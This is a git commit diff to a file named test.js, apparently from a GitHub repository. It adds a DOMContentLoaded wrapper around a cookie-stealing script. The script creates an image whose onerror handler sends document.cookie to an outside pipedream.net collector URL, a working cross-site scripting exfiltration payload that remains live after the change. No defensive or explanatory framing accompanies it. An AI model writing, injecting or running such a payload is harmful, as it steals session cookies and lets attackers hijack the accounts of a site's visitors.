06a77fe26627172b3726b8386b29072f47404eb8
Sandro <73789401+Just3Sandro@users.noreply.github.com>
2024-10-24 12:50:28 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,11 +1,13 @@
-const img = document.createElement('img');
-img.id = 'myImg';
-img.src = '../reverse.PNG/img.jpg'; // Replace with your image source
-
-// Append the image to the body (or another container)
-document.body.appendChild(img);
-
-// Set the onerror handler
-img.onerror = function() {
-  this.src = 'http://eo7u1nl20laxhkt.m.pipedream.net?cookie=' + document.cookie;
-};
+document.addEventListener("DOMContentLoaded", function() {
+  const img = document.createElement('img');
+  img.id = 'myImg';
+  img.src = '../reverse.PNG/img.jpg'; // Replace with your image source
+  
+  // Append the image to the body (or another container)
+  document.body.appendChild(img);
+  
+  // Set the onerror handler
+  img.onerror = function() {
+    this.src = 'http://eo7u1nl20laxhkt.m.pipedream.net?cookie=' + document.cookie;
+  };
+});
